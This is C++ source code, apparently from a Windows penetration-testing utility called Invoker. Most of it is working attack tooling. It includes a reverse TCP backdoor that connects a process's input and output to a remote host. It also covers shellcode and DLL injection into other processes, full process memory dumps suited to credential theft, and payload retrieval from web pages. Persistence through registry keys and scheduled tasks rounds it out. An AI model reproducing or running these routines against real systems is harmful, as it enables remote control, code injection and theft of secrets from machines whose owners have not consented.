// Copyright (c) 2019 Ivan Šincek
// v4.2.1

#pragma  comment(lib, "user32")
#pragma  comment(lib, "advapi32")
#include <winsock2.h>
#pragma  comment(lib, "ws2_32")
#include <ws2tcpip.h>
#include ".\invoker.h"
#include <iostream>
#include <fstream>
#pragma  comment(lib, "ole32")
#pragma  comment(lib, "oleaut32")
#include <initguid.h>
#include <mstask.h>
#pragma  comment(lib, "uuid")
#include <wbemidl.h>
#pragma  comment(lib, "wbemuuid")
#include <tlhelp32.h>
#include <winhttp.h>
#pragma  comment(lib, "winhttp")

// --------------------------------------- SECTION: STRINGS

bool StrToDWORD(std::string str, PDWORD out) {
	bool success = true;
	*out = std::strtoul(str.c_str(), NULL, 0);
	if (errno == ERANGE) {
		success = false;
		errno = 0;
	}
	return success;
}

std::string StrToLower(std::string str) {
	size_t length = str.length();
	for (size_t i = 0; i < length; i++) {
		str[i] = tolower(str[i]);
	}
	return str;
}

std::string StrToUpper(std::string str) {
	size_t length = str.length();
	for (size_t i = 0; i < length; i++) {
		str[i] = toupper(str[i]);
	}
	return str;
}

std::string Trim(std::string str) {
	const char spacing[] = "\x20\x09\x10\x11\x12\x13\x0A\x0D";
	str.erase(0, str.find_first_not_of(spacing));
	str.erase(str.find_last_not_of(spacing) + 1);
	return str;
}

std::string Input(std::string msg) {
	printf("%s", msg.append(": ").c_str());
	std::string var = "";
	getline(std::cin, var);
	return Trim(var);
}

bool IsPositiveNumber(std::string str) {
	const char numbers[] = "0123456789";
	return str.find_first_not_of(numbers) == std::string::npos;
}

std::string StrStripFront(std::string str, std::string delim, bool clear) {
	size_t pos = str.find(delim);
	if (pos != std::string::npos) {
		str.erase(0, pos + delim.length());
	}
	else if (clear) {
		str.clear();
	}
	return str;
}

std::string StrStripBack(std::string str, std::string delim, bool clear) {
	size_t pos = str.find(delim);
	if (pos != std::string::npos) {
		str.erase(pos);
	}
	else if (clear) {
		str.clear();
	}
	return str;
}

url ParseURL(std::string addr) {
	url info = { };
	info.schema = StrToLower(StrStripBack(addr, "://", true));
	addr = StrStripFront(addr, "://");
	info.pathFull = std::string("/").append(StrStripFront(addr, "/", true));
	info.fragment = StrStripFront(addr, "#", true);
	addr = StrStripBack(addr, "#");
	info.query = StrStripFront(addr, "?", true);
	addr = StrStripBack(addr, "?");
	info.path = std::string("/").append(StrStripFront(addr, "/", true));
	addr = StrStripBack(addr, "/");
	info.port = StrStripFront(addr, ":", true);
	info.host = StrStripBack(addr, ":");
	return info;
}

/*
std::string GetErrorMessage(DWORD code) {
	LPSTR msg = NULL;
	FormatMessageA((FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_IGNORE_INSERTS), NULL, code, MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), (LPSTR)&msg, 0, NULL);
	return msg == NULL ? "Cannot generate the success/error message" : Trim(msg);
}
*/

// --------------------------------------- SECTION: SHELLS

std::string GetFilePath(HMODULE hModule) {
	char buffer[MAX_PATH] = "";
	if (GetModuleFileNameA(hModule, buffer, sizeof(buffer)) == 0) {
		printf("Cannot get the file path\n");
	}
	return buffer;
}

void Pause() {
	printf("\n");
	printf("Press any key to continue . . . "); (void)getchar(); printf("\n");
}

void Clear() {
	if (system(CHECK_SHELL_ACCESS) == 0) {
		system("CLS");
	}
	else {
		printf("\n");
	}
}

bool IsShellAccessible() {
	bool success = false;
	if (system(CHECK_SHELL_ACCESS) == 0) {
		success = true;
	}
	else {
		printf("Cannot access the shell\n");
	}
	return success;
}

void ShellExec(std::string command) {
	if (IsShellAccessible()) {
		command.length() > 0 ? command.insert(0, "CMD /K \"").append("\"") : command.append("CMD");
		system(command.c_str());
	}
}

// NOTE: Command must be a PowerShell encoded command.
void PowerShellExec(std::string command) {
	if (IsShellAccessible()) {
		command.length() > 0 ? command.insert(0, "PowerShell -ExecutionPolicy Unrestricted -NoProfile -EncodedCommand \"").append("\"") : command.append("PowerShell -ExecutionPolicy Unrestricted -NoProfile");
		system(command.c_str());
	}
}

// --------------------------------------- SECTION: FILES

bool MakeFile(std::string file, std::string data) {
	bool success = false;
	std::ofstream stream(file.c_str(), (std::ios::out | std::ios::trunc | std::ios::binary));
	if (stream.fail()) {
		printf("Cannot create \"%s\"\n", file.c_str());
	}
	else {
		if (data.length() > 0 && stream.write(data.c_str(), data.length()) && stream.bad()) {
			printf("Failed to write to \"%s\"\n", file.c_str());
		}
		else {
			success = true;
			printf("\"%s\" has been created successfully\n", file.c_str());
		}
		stream.close();
	}
	return success;
}

std::string ReadFile(std::string file) {
	std::string data = "";
	std::ifstream stream(file.c_str(), (std::ios::in | std::ios::binary));
	if (stream.fail()) {
		printf("Cannot read \"%s\"\n", file.c_str());
	}
	else {
		char* buffer = new char[STREAM_BUFFER_SIZE];
		while (!stream.eof() && !stream.bad()) {
			stream.read(buffer, sizeof(buffer));
			if (stream.gcount() > 0) {
				data.append(buffer, stream.gcount());
			}
		}
		delete[] buffer;
		if (stream.bad()) {
			// NOTE: Clear partially read data.
			data.clear();
			printf("Failed to read from \"%s\"\n", file.c_str());
		}
		else if (data.length() < 1) {
			printf("\"%s\" is empty\n", file.c_str());
		}
		stream.close();
	}
	return data;
}

bool AppendFile(std::string file, std::string data) {
	bool success = false;
	std::ofstream stream(file.c_str(), (std::ios::app | std::ios::binary));
	if (!stream.fail()) {
		stream.write(data.c_str(), data.length());
		stream.close();
		if (!stream.bad()) {
			success = true;
		}
	}
	return success;
}

bool DownloadFile(std::string addr, std::string file) {
	bool success = false;
	HMODULE hLib = LoadLibraryA("urlmon.dll");
	if (hLib == NULL) {
		printf("Cannot load the \"urlmon.dll\"\n");
	}
	else {
		MyURLDownloadToFile Function = (MyURLDownloadToFile)GetProcAddress(hLib, "URLDownloadToFileA");
		if (Function == NULL) {
			printf("Cannot get the address of URLDownloadToFileA()\n");
		}
		else if (FAILED(Function(NULL, addr.c_str(), file.c_str(), 0, NULL))) {
			printf("Cannot download \"%s\"\n", addr.c_str());
		}
		else {
			success = true;
			printf("Download has been saved to \"%s\"\n", file.c_str());
		}
		FreeLibrary(hLib);
	}
	return success;
}

// --------------------------------------- SECTION: PERSISTENCE

// TO DO: List all registry keys.
// TO DO: Delete a registry key.
bool EditRegistryKey(PHKEY hKey, std::string subkey, std::string name, std::string data) {
	bool success = false;
	HKEY nKey = NULL;
	if (RegCreateKeyExA(*hKey, subkey.c_str(), 0, NULL, REG_OPTION_NON_VOLATILE, (KEY_CREATE_SUB_KEY | KEY_SET_VALUE), NULL, &nKey, NULL) != ERROR_SUCCESS) {
		printf("Cannot create/open the registry key\n");
	}
	else {
		if (RegSetValueExA(nKey, name.c_str(), 0, REG_SZ, (LPBYTE)data.c_str(), data.length()) != ERROR_SUCCESS) {
			printf("Cannot add/eddit the registry key\n");
		}
		else {
			success = true;
			printf("Registry key has been added/edited successfully\n");
		}
		RegCloseKey(nKey);
	}
	return success;
}

// TO DO: List all active local users.
bool ScheduleTask(std::string name, std::string user, std::string file, std::string args) {
	bool success = false;
	if (FAILED(CoInitializeEx(NULL, COINIT_MULTITHREADED))) {
		printf("Cannot initialize the use of COM library\n");
	}
	else {
		ITaskScheduler* tskschd = NULL;
		if (FAILED(CoCreateInstance(CLSID_CTaskScheduler, NULL, CLSCTX_INPROC_SERVER, IID_ITaskScheduler, (LPVOID*)&tskschd))) {
			printf("Cannot create the COM class object of Task Scheduler\n");
		}
		else {
			ITask* task = NULL;
			if (FAILED(tskschd->NewWorkItem(std::wstring(name.begin(), name.end()).c_str(), CLSID_CTask, IID_ITask, (IUnknown**)&task))) {
				printf("Cannot create the task\n");
			}
			else {
				task->SetAccountInformation(std::wstring(user.begin(), user.end()).c_str(), NULL);
				task->SetApplicationName(std::wstring(file.begin(), file.end()).c_str());
				task->SetParameters(std::wstring(args.begin(), args.end()).c_str());
				// NOTE: Task will run only if the user is logged on interactively.
				task->SetFlags(TASK_FLAG_RUN_ONLY_IF_LOGGED_ON);
				WORD index = 0;
				ITaskTrigger* trigger = NULL;
				if (FAILED(task->CreateTrigger(&index, &trigger))) {
					printf("Cannot create the trigger\n");
				}
				else {
					SYSTEMTIME now = { };
					GetLocalTime(&now);
					TASK_TRIGGER info = { };
					info.cbTriggerSize = sizeof(info);
					// NOTE: Task will run only once.
					info.TriggerType = TASK_TIME_TRIGGER_ONCE;
					// NOTE: Task will run after exactly one minute.
					info.wStartMinute = now.wMinute + 1;
					info.wStartHour = now.wHour;
					info.wBeginDay = now.wDay;
					info.wBeginMonth = now.wMonth;
					info.wBeginYear = now.wYear;
					if (FAILED(trigger->SetTrigger(&info))) {
						printf("Cannot set the trigger\n");
					}
					else {
						IPersistFile* pFile = NULL;
						if (FAILED(task->QueryInterface(IID_IPersistFile, (LPVOID*)&pFile))) {
							printf("Cannot get the persistence interface\n");
						}
						else {
							if (FAILED(pFile->Save(NULL, TRUE))) {
								printf("Cannot save the task object to a file\n");
							}
							else {
								success = true;
								printf("Task has been scheduled successfully\n");
							}
							pFile->Release();
						}
					}
					trigger->Release();
				}
				task->Release();
			}
			tskschd->Release();
		}
		CoUninitialize();
	}
	return success;
}

// --------------------------------------- SECTION: WMI

void WMIRunQuery(std::string query, std::string language, std::string space) {
	if (FAILED(CoInitializeEx(NULL, COINIT_MULTITHREADED))) {
		printf("Cannot initialize the use of COM library\n");
	}
	else {
		if (FAILED(CoInitializeSecurity(NULL, -1, NULL, NULL, RPC_C_AUTHN_LEVEL_DEFAULT, RPC_C_IMP_LEVEL_IMPERSONATE, NULL, EOAC_NONE, NULL))) {
			printf("Cannot initialize the use of COM security\n");
		}
		else {
			IWbemLocator* locator = NULL;
			if (FAILED(CoCreateInstance(CLSID_WbemLocator, NULL, CLSCTX_INPROC_SERVER, IID_IWbemLocator, (LPVOID*)&locator))) {
				printf("Cannot create the COM class object of WMI\n");
			}
			else {
				BSTR bstrSpace = SysAllocString(std::wstring(space.begin(), space.end()).c_str());
				IWbemServices* services = NULL;
				if (FAILED(locator->ConnectServer(bstrSpace, NULL, NULL, NULL, 0, NULL, NULL, &services))) {
					printf("Cannot connect to the WMI namespace\n");
				}
				else {
					if (FAILED(CoSetProxyBlanket(services, RPC_C_AUTHN_WINNT, RPC_C_AUTHZ_NONE, NULL, RPC_C_AUTHN_LEVEL_CALL, RPC_C_IMP_LEVEL_IMPERSONATE, NULL, EOAC_NONE))) {
						printf("Cannot set the WMI proxy\n");
					}
					else {
						BSTR bstrLanguage = SysAllocString(std::wstring(language.begin(), language.end()).c_str());
						BSTR bstrQuery = SysAllocString(std::wstring(query.begin(), query.end()).c_str());
						IEnumWbemClassObject* enumerator = NULL;
						if (FAILED(services->ExecQuery(bstrLanguage, bstrQuery, WBEM_FLAG_FORWARD_ONLY, NULL, &enumerator))) {
							printf("Cannot execute the WMI query\n");
						}
						else {
							IWbemClassObject* obj[WMI_ARRAY_SIZE] = { };
							ULONG returned = 0;
							bool exists = false;
							while (SUCCEEDED(enumerator->Next(WBEM_INFINITE, WMI_ARRAY_SIZE, obj, &returned)) && returned > 0) {
								exists = true;
								for (ULONG i = 0; i < returned; i++) {
									if (i != 0) { printf("\n"); }
									SAFEARRAY* array = NULL;
									LONG start = 0, end = 0;
									BSTR* bstr = NULL;
									if (FAILED(obj[i]->GetNames(0, WBEM_FLAG_ALWAYS, 0, &array)) || FAILED(SafeArrayGetLBound(array, 1, &start)) || FAILED(SafeArrayGetUBound(array, 1, &end)) || FAILED(SafeArrayAccessData(array, (void HUGEP**) & bstr))) {
										printf("Cannot parse the WMI class object\n");
									}
									else {
										for (LONG j = start; j <= end; j++) {
											// NOTE: Ignore system properties.
											if (wcsncmp(bstr[j], L"__", 2) != 0) {
												VARIANT data;
												VariantInit(&data);
												if (SUCCEEDED(obj[i]->Get(bstr[j], 0, &data, NULL, 0)) && V_VT(&data) == VT_BSTR) {
													printf("%ls: %ls\n", bstr[j], V_BSTR(&data));
												}
												VariantClear(&data);
											}
										}
										SafeArrayUnaccessData(array);
										SafeArrayDestroy(array);
										array = NULL;
									}
									obj[i]->Release();
								}
							}
							if (!exists) {
								printf("No results\n");
							}
							enumerator->Release();
						}
						SysFreeString(bstrQuery);
						SysFreeString(bstrLanguage);
					}
					services->Release();
				}
				SysFreeString(bstrSpace);
				locator->Release();
			}
		}
		CoUninitialize();
	}
}

bool WMIExecuteMethod(std::string instance, std::string cls, std::string method, std::string space) {
	bool success = false;
	if (FAILED(CoInitializeEx(NULL, COINIT_MULTITHREADED))) {
		printf("Cannot initialize the use of COM library\n");
	}
	else {
		if (FAILED(CoInitializeSecurity(NULL, -1, NULL, NULL, RPC_C_AUTHN_LEVEL_DEFAULT, RPC_C_IMP_LEVEL_IMPERSONATE, NULL, EOAC_NONE, NULL))) {
			printf("Cannot initialize the use of COM security\n");
		}
		else {
			IWbemLocator* locator = NULL;
			if (FAILED(CoCreateInstance(CLSID_WbemLocator, NULL, CLSCTX_INPROC_SERVER, IID_IWbemLocator, (LPVOID*)&locator))) {
				printf("Cannot create the COM class object of WMI\n");
			}
			else {
				BSTR bstrSpace = SysAllocString(std::wstring(space.begin(), space.end()).c_str());
				IWbemServices* services = NULL;
				if (FAILED(locator->ConnectServer(bstrSpace, NULL, NULL, NULL, 0, NULL, NULL, &services))) {
					printf("Cannot connect to the WMI namespace\n");
				}
				else {
					if (FAILED(CoSetProxyBlanket(services, RPC_C_AUTHN_WINNT, RPC_C_AUTHZ_NONE, NULL, RPC_C_AUTHN_LEVEL_CALL, RPC_C_IMP_LEVEL_IMPERSONATE, NULL, EOAC_NONE))) {
						printf("Cannot set the WMI proxy\n");
					}
					else {
						BSTR bstrClass = SysAllocString(std::wstring(cls.begin(), cls.end()).c_str());
						IWbemClassObject* objClass = NULL;
						if (FAILED(services->GetObjectW(bstrClass, 0, NULL, &objClass, NULL))) {
							printf("Cannot get the WMI object class\n");
						}
						else {
							BSTR bstrInstance = SysAllocString(std::wstring(instance.begin(), instance.end()).c_str());
							BSTR bstrMethod = SysAllocString(std::wstring(method.begin(), method.end()).c_str());
							IWbemClassObject* objResults = NULL;
							if (FAILED(services->ExecMethod(bstrInstance, bstrMethod, 0, NULL, NULL, &objResults, NULL))) {
								printf("Cannot execute the WMI object class method\n");
							}
							else {
								success = true;
								printf("WMI object class method has been executed successfully\n");
							}
							SysFreeString(bstrMethod);
							SysFreeString(bstrInstance);
							objClass->Release();
						}
						SysFreeString(bstrClass);
					}
					services->Release();
				}
				SysFreeString(bstrSpace);
				locator->Release();
			}
		}
		CoUninitialize();
	}
	return success;
}

bool WMIExecuteMethod(std::string instance, std::string cls, std::string method, std::string property, std::string value, std::string space) {
	bool success = false;
	if (FAILED(CoInitializeEx(NULL, COINIT_MULTITHREADED))) {
		printf("Cannot initialize the use of COM library\n");
	}
	else {
		if (FAILED(CoInitializeSecurity(NULL, -1, NULL, NULL, RPC_C_AUTHN_LEVEL_DEFAULT, RPC_C_IMP_LEVEL_IMPERSONATE, NULL, EOAC_NONE, NULL))) {
			printf("Cannot initialize the use of COM security\n");
		}
		else {
			IWbemLocator* locator = NULL;
			if (FAILED(CoCreateInstance(CLSID_WbemLocator, NULL, CLSCTX_INPROC_SERVER, IID_IWbemLocator, (LPVOID*)&locator))) {
				printf("Cannot create the COM class object of WMI\n");
			}
			else {
				BSTR bstrSpace = SysAllocString(std::wstring(space.begin(), space.end()).c_str());
				IWbemServices* services = NULL;
				if (FAILED(locator->ConnectServer(bstrSpace, NULL, NULL, NULL, 0, NULL, NULL, &services))) {
					printf("Cannot connect to the WMI namespace\n");
				}
				else {
					if (FAILED(CoSetProxyBlanket(services, RPC_C_AUTHN_WINNT, RPC_C_AUTHZ_NONE, NULL, RPC_C_AUTHN_LEVEL_CALL, RPC_C_IMP_LEVEL_IMPERSONATE, NULL, EOAC_NONE))) {
						printf("Cannot set the WMI proxy\n");
					}
					else {
						BSTR bstrClass = SysAllocString(std::wstring(cls.begin(), cls.end()).c_str());
						IWbemClassObject* objClass = NULL;
						if (FAILED(services->GetObjectW(bstrClass, 0, NULL, &objClass, NULL))) {
							printf("Cannot get the WMI object class\n");
						}
						else {
							BSTR bstrMethod = SysAllocString(std::wstring(method.begin(), method.end()).c_str());
							IWbemClassObject* objMethod = NULL;
							if (FAILED(objClass->GetMethod(bstrMethod, 0, &objMethod, NULL))) {
								printf("Cannot get the WMI object class method\n");
							}
							else {
								IWbemClassObject* objInstance = NULL;
								if (FAILED(objMethod->SpawnInstance(0, &objInstance))) {
									printf("Cannot spawn the new instance of WMI class object\n");
								}
								else {
									BSTR bstrProperty = SysAllocString(std::wstring(property.begin(), property.end()).c_str());
									VARIANT data;
									VariantInit(&data);
									V_VT(&data) = VT_BSTR;
									V_BSTR(&data) = SysAllocString(std::wstring(value.begin(), value.end()).c_str());
									if (FAILED(objInstance->Put(bstrProperty, 0, &data, 0))) {
										printf("Cannot set the property of new WMI class object\n");
									}
									else {
										BSTR bstrInstance = SysAllocString(std::wstring(instance.begin(), instance.end()).c_str());
										IWbemClassObject* objResults = NULL;
										if (FAILED(services->ExecMethod(bstrInstance, bstrMethod, 0, NULL, objInstance, &objResults, NULL))) {
											printf("Cannot execute the WMI object class method\n");
										}
										else {
											success = true;
											printf("WMI object class method has been executed successfully\n");
										}
										SysFreeString(bstrInstance);
									}
									VariantClear(&data);
									SysFreeString(bstrProperty);
									objInstance->Release();
								}
								objMethod->Release();
							}
							SysFreeString(bstrMethod);
							objClass->Release();
						}
						SysFreeString(bstrClass);
					}
					services->Release();
				}
				SysFreeString(bstrSpace);
				locator->Release();
			}
		}
		CoUninitialize();
	}
	return success;
}

// --------------------------------------- SECTION: PROCESSES

// NOTE: Process will run as a child process.
// TO DO: Try to run process as detached process.
// TO DO: Handle server socket termination.
bool ReverseTCP(std::string host, std::string port, std::string file, std::string args) {
	bool success = false;
	WSADATA WSAData = { };
	if (WSAStartup(MAKEWORD(2, 2), &WSAData) != 0) {
		printf("Cannot initiate the use of Winsock DLL\n");
	}
	else {
		addrinfoW info = { };
		info.ai_family = AF_INET;
		info.ai_socktype = SOCK_STREAM;
		info.ai_protocol = IPPROTO_TCP;
		addrinfoW* result = NULL;
		if (GetAddrInfoW(std::wstring(host.begin(), host.end()).c_str(), std::wstring(port.begin(), port.end()).c_str(), &info, &result) != 0) {
			printf("Cannot resolve the server address\n");
		}
		else {
			bool connected = false;
			for (addrinfoW* ptr = result; !connected && ptr != NULL; ptr = ptr->ai_next) {
				SOCKET hSocket = WSASocketW(ptr->ai_family, ptr->ai_socktype, ptr->ai_protocol, NULL, 0, 0);
				if (hSocket != INVALID_SOCKET) {
					if (WSAConnect(hSocket, ptr->ai_addr, (int)ptr->ai_addrlen, NULL, NULL, NULL, NULL) == 0) {
						connected = true;
						STARTUPINFOA sInfo = { };
						sInfo.cb = sizeof(sInfo);
						sInfo.dwFlags = STARTF_USESTDHANDLES;
						sInfo.hStdInput = sInfo.hStdOutput = sInfo.hStdError = (HANDLE)hSocket;
						PROCESS_INFORMATION pInfo = { };
						if (CreateProcessA(file.length() > 0 ? file.c_str() : NULL, (LPSTR)args.c_str(), NULL, NULL, TRUE, 0, NULL, NULL, &sInfo, &pInfo) == 0) {
							printf("Cannot run the process\n");
						}
						else {
							success = true;
							printf("Backdoor is up and running...\n");
							CloseHandle(pInfo.hThread);
							CloseHandle(pInfo.hProcess);
						}
					}
					closesocket(hSocket);
				}
			}
			if (!connected) {
				printf("Cannot connect to the server\n");
			}
			FreeAddrInfoW(result);
		}
		WSACleanup();
	}
	return success;
}

// NOTE: Returns true if process is a 32-bit process, false otherwise.
bool IsWoW64(DWORD pid) {
	BOOL success = FALSE;
	HANDLE hProcess = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid);
	if (hProcess != NULL) {
		IsWow64Process(hProcess, &success);
		CloseHandle(hProcess);
	}
	return success;
}

bool GetProcessID(PDWORD out) {
	bool success = false;
	HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (hSnapshot == INVALID_HANDLE_VALUE) {
		printf("Cannot create the snapshot of current processes\n");
	}
	else {
		PROCESSENTRY32W entry = { };
		entry.dwSize = sizeof(entry);
		printf("############################### PROCESS LIST ###############################\n");
		printf("# %-6s | %-*.*s | %-4s #\n", "PID", 56, 56, "NAME", "ARCH");
		printf("#--------------------------------------------------------------------------#\n");
		while (Process32NextW(hSnapshot, &entry)) {
			printf("# %-6d | %-*.*ls |  %-2s  #\n", entry.th32ProcessID, 56, 56, entry.szExeFile, IsWoW64(entry.th32ProcessID) ? "32" : "64");
		}
		printf("############################################################################\n");
		DWORD pid = 0;
		std::string id = Input("Enter proccess ID");
		if (id.length() < 1) {
			printf("\n");
			printf("Process ID is rquired\n");
		}
		else if (!IsPositiveNumber(id)) {
			printf("\n");
			printf("Process ID must be a positive number\n");
		}
		else if (!StrToDWORD(id, &pid)) {
			printf("\n");
			printf("Failed to convert process ID to DWORD\n");
		}
		else {
			Process32FirstW(hSnapshot, &entry);
			do {
				if (entry.th32ProcessID == pid) {
					*out = entry.th32ProcessID;
					success = true;
					break;
				}
			} while (Process32NextW(hSnapshot, &entry));
			if (!success) {
				printf("\n");
				printf("Process does not exists\n");
			}
		}
		CloseHandle(hSnapshot);
	}
	return success;
}

bool ShutDownProcess(DWORD pid) {
	bool success = false;
	HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, FALSE, pid);
	if (hProcess == NULL) {
		printf("Cannot get the process handle\n");
	}
	else {
		if (TerminateProcess(hProcess, 0) == 0) {
			printf("Cannot terminate the process\n");
		}
		else {
			success = true;
			printf("Process has been terminated successfully\n");
		}
		CloseHandle(hProcess);
	}
	return success;
}

// NOTE: Process will run in a new window.
bool RunProcess(std::string file, std::string args, PHANDLE hToken) {
	bool success = false;
	PROCESS_INFORMATION pInfo = { };
	if (hToken == NULL) {
		STARTUPINFOA sInfo = { };
		sInfo.cb = sizeof(sInfo);
		if (CreateProcessA(file.c_str(), (LPSTR)args.c_str(), NULL, NULL, FALSE, CREATE_NEW_CONSOLE, NULL, NULL, &sInfo, &pInfo) != 0) {
			success = true;
		}
	}
	else {
		STARTUPINFOW sInfo = { };
		sInfo.cb = sizeof(sInfo);
		if (CreateProcessWithTokenW(*hToken, LOGON_WITH_PROFILE, std::wstring(file.begin(), file.end()).c_str(), (LPWSTR)args.c_str(), CREATE_NEW_CONSOLE, NULL, NULL, &sInfo, &pInfo) != 0) {
			success = true;
		}
	}
	if (!success) {
		printf("Cannot run the process\n");
	}
	else {
		printf("Process has been run successfully\n");
		CloseHandle(pInfo.hThread);
		CloseHandle(pInfo.hProcess);
	}
	return success;
}

bool DumpProcessMemory(DWORD pid) {
	bool success = false;
	HANDLE hProcess = OpenProcess((PROCESS_QUERY_LIMITED_INFORMATION | PROCESS_VM_READ), FALSE, pid);
	if (hProcess == NULL) {
		printf("Cannot get the process handle\n");
	}
	else {
		HMODULE hLib = LoadLibraryA("dbgcore.dll");
		if (hLib == NULL) {
			printf("Cannot load the \"dbgcore.dll\"\n");
		}
		else {
			MyMiniDumpWriteDump Function = (MyMiniDumpWriteDump)GetProcAddress(hLib, "MiniDumpWriteDump");
			if (Function == NULL) {
				printf("Cannot get the address of MiniDumpWriteDump()\n");
			}
			else {
				std::string file = std::string("proc_mem_").append(std::to_string(pid)).append(".dmp");
				HANDLE hFile = CreateFileA(file.c_str(), GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
				if (hFile == INVALID_HANDLE_VALUE) {
					printf("Cannot create \"%s\"\n", file.c_str());
				}
				else if (Function(hProcess, pid, hFile, 0x00000001, NULL, NULL, NULL) == 0) {
					// NOTE: 0x00000001 == MiniDumpWithFullMemory
					CloseHandle(hFile);
					DeleteFileA(file.c_str());
					printf("Cannot dump the process memory\n");
				}
				else {
					success = true;
					printf("Process memory has been successfully dumped to \"%s\"\n", file.c_str());
					CloseHandle(hFile);
				}
			}
			FreeLibrary(hLib);
		}
		CloseHandle(hProcess);
	}
	return success;
}

// --------------------------------------- SECTION: BYTECODES

std::string GetWebContent(std::string host, DWORD port, std::string path, bool secure, std::string method, std::string agent) {
	std::string data = "";
	HINTERNET hSession = WinHttpOpen(std::wstring(agent.begin(), agent.end()).c_str(), WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
	if (hSession == NULL) {
		printf("Cannot get the HTTP session handle\n");
	}
	else {
		HINTERNET hConnect = WinHttpConnect(hSession, std::wstring(host.begin(), host.end()).c_str(), port, 0);
		if (hConnect == NULL) {
			printf("Cannot connect to the server\n");
		}
		else {
			HINTERNET hRequest = WinHttpOpenRequest(hConnect, std::wstring(method.begin(), method.end()).c_str(), std::wstring(path.begin(), path.end()).c_str(), NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, secure ? WINHTTP_FLAG_SECURE : 0);
			if (hRequest == NULL) {
				printf("Cannot get the HTTP request handle\n");
			}
			else {
				if (!WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, WINHTTP_NO_REQUEST_DATA, 0, 0, 0)) {
					printf("Cannot send the HTTP request\n");
				}
				else if (!WinHttpReceiveResponse(hRequest, NULL)) {
					printf("No HTTP response was received\n");
				}
				else {
					char* buffer = new char[STREAM_BUFFER_SIZE];
					DWORD bytes = 0;
					BOOL success = TRUE;
					while ((success = WinHttpReadData(hRequest, buffer, sizeof(buffer), &bytes)) && bytes > 0) {
						data.append(buffer, bytes);
					}
					delete[] buffer;
					if (!success) {
						// NOTE: Clear partially read data.
						data.clear();
						printf("Failed to read the HTTP response\n");
					}
					else if (data.length() < 1) {
						printf("HTTP response is empty\n");
					}
				}
				WinHttpCloseHandle(hRequest);
			}
			WinHttpCloseHandle(hConnect);
		}
		WinHttpCloseHandle(hSession);
	}
	return data;
}

std::string ExtractPayload(std::string data, std::string element, std::string placeholder) {
	std::string payload = "";
	if (element.find(placeholder) == std::string::npos) {
		printf("Payload placeholder has not been found\n");
	}
	else {
		std::string front = StrStripBack(element, placeholder);
		std::string back = StrStripFront(element, placeholder);
		if (front.length() < 1 || back.length() < 1) {
			printf("Payload must be enclosed from both front and back\n");
		}
		else {
			data = StrStripBack(data, back, true);
			data = StrStripFront(data, front, true);
			if (data.length() < 1) {
				printf("Custom element has not been found or is empty\n");
			}
			else {
				payload = data;
				printf("Payload has been extracted successfully\n");
			}
		}
	}
	return payload;
}

bool InjectBytecode(DWORD pid, std::string bytecode) {
	bool success = false;
	HANDLE hProcess = OpenProcess((PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_CREATE_THREAD), FALSE, pid);
	if (hProcess == NULL) {
		printf("Cannot get the process handle\n");
	}
	else {
		LPVOID addr = VirtualAllocEx(hProcess, NULL, bytecode.length(), (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
		if (addr == NULL) {
			printf("Cannot allocate the additional process memory\n");
		}
		else {
			if (WriteProcessMemory(hProcess, addr, bytecode.c_str(), bytecode.length(), NULL) == 0) {
				printf("Cannot write to the process memory\n");
			}
			else {
				HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)addr, NULL, 0, NULL);
				if (hThread == NULL) {
					printf("Cannot start the process thread\n");
				}
				else {
					success = true;
					printf("Bytecode has been injected successfully\n");
					CloseHandle(hThread);
				}
			}
			VirtualFreeEx(hProcess, addr, 0, MEM_RELEASE);
		}
		CloseHandle(hProcess);
	}
	return success;
}

// --------------------------------------- SECTION: DLLS

bool InjectDLL(DWORD pid, std::string file) {
	bool success = false;
	HANDLE hProcess = OpenProcess((PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_CREATE_THREAD), FALSE, pid);
	if (hProcess == NULL) {
		printf("Cannot get the process handle\n");
	}
	else {
		LPVOID addr = VirtualAllocEx(hProcess, NULL, file.length(), (MEM_RESERVE | MEM_COMMIT), PAGE_READWRITE);
		if (addr == NULL) {
			printf("Cannot allocate the additional process memory\n");
		}
		else {
			if (WriteProcessMemory(hProcess, addr, file.c_str(), file.length(), NULL) == 0) {
				printf("Cannot write to the process memory\n");
			}
			else {
				HMODULE hLib = GetModuleHandleA("kernel32.dll\n");
				if (hLib == NULL) {
					printf("Cannot get the handle of \"kernel32.dll\"\n");
				}
				else {
					LPTHREAD_START_ROUTINE lpRoutine = (LPTHREAD_START_ROUTINE)GetProcAddress(hLib, "LoadLibraryA");
					if (lpRoutine == NULL) {
						printf("Cannot get the address of LoadLibraryA()\n");
					}
					else {
						HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, lpRoutine, addr, 0, NULL);
						if (hThread == NULL) {
							printf("Cannot start the process thread\n");
						}
						else {
							success = true;
							printf("DLL has been injected successfully\n");
							CloseHandle(hThread);
						}
					}
				}
			}
			VirtualFreeEx(hProcess, addr, 0, MEM_RELEASE);
		}
		CloseHandle(hProcess);
	}
	return success;
}

// NOTE: This method will only list loaded DLLs.
// TO DO: List missing DLLs.
void ListProcessDLLs(DWORD pid) {
	HANDLE hSnapshot = CreateToolhelp32Snapshot((TH32CS_SNAPMODULE32 | TH32CS_SNAPMODULE), pid);
	if (hSnapshot == INVALID_HANDLE_VALUE) {
		printf("Cannot create the snapshot of process modules\n");
	}
	else {
		MODULEENTRY32W entry = { };
		entry.dwSize = sizeof(entry);
		bool exists = false;
		while (Module32NextW(hSnapshot, &entry)) {
			exists = true;
			printf("%ls\n", entry.szExePath);
		}
		if (!exists) {
			printf("No DLLs are loaded\n");
		}
		CloseHandle(hSnapshot);
	}
}

